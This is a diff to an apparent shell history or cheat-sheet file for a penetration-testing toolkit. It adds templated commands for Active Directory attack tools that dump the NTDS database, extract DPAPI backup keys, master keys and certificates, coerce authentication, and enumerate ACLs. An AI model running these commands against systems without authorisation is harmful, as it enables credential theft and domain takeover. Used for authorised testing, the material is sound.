@@ -72,3 +72,17 @@ dpapi.py masterkey -file $KEY_FILE -sid $USER_SID -password $USER_PASSWORD
 dpapi.py credential -file $CYPHERED_BLOB -key $KEY
 donpapi collect -t $IP -d $DOMAIN -u $USER -p $PASSWORD
 faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
+networkhound_update_custom_nodes_to_bloodhound -s https://127.0.0.1 -u $USER -p $PASSWORD -m /opt/NetworkHound/model.json
+networkhound --dc $IP -d $DOMAIN -u $USER -p $PASSWORD
+chepy encoding
+pyntdsutil $DOMAIN/$USER:$PASSWORD@$DC_IP
+krbjack check --domain $DOMAIN --dc-ip $DC_IP
+gixy nginx.conf
+dploot backupkey -d $DOMAIN -u $USER -p $PASSWORD -t $DC_IP
+dploot certificates -d $DOMAIN -u $USER -p $PASSWORD -t $IP -pvk $BACKUPKEY.pvk
+dploot masterkeys -d $DOMAIN -u $USER -p $PASSWORD -t $IP -passwords $PASSWORDS_FILE
+acltoolkit $DOMAIN/$USER:$PASSWORD@$DC_IP get-objectacl -object $TARGET
+powerview $DOMAIN/$USER:$PASSWORD@$DC_IP --web
+arsenal
+coercer scan -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
+coercer coerce -l $LOCAL_IP -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
